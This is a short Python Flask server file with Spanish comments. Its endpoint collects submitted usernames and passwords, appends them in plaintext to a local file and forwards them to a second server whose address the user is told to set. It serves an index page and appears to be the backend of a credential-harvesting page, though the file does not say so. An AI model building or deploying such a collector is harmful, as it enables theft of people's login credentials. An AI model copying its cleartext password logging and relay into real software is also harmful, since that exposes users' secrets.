from flask import Flask, request, render_template, jsonify
import requests

app = Flask(__name__)

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400

    try:
        # Guardar los datos en un archivo local
        with open('../saved_data.txt', 'a') as file:
            file.write(f"Username: {data['username']}, Password: {data['password']}\n")

        # Enviar los datos a otro servidor (si es necesario)
        # Cambia la URL a la dirección de tu servidor
        response = requests.post('http://192.168.0.1:5001/save-data', json=data)
        if response.status_code == 200:
            return jsonify({"status": "success", "message": "Data saved and sent successfully"})
        else:
            return jsonify({"status": "warning", "message": "Data saved locally but failed to send to server"}), response.status_code
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == "__main__":
    from waitress import serve
    serve(app, host="0.0.0.0", port=5000)
